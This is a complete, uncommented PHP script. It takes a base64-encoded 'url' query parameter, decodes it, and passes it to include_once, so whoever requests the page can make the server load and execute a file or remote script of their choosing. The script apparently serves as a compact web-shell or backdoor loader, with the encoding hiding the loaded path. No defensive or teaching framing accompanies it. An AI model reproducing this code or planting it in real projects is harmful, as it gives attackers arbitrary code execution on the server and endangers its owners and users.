<?php
$url = $_GET['url'];
$url_dec = base64_decode("$url");
include_once($url_dec);
?>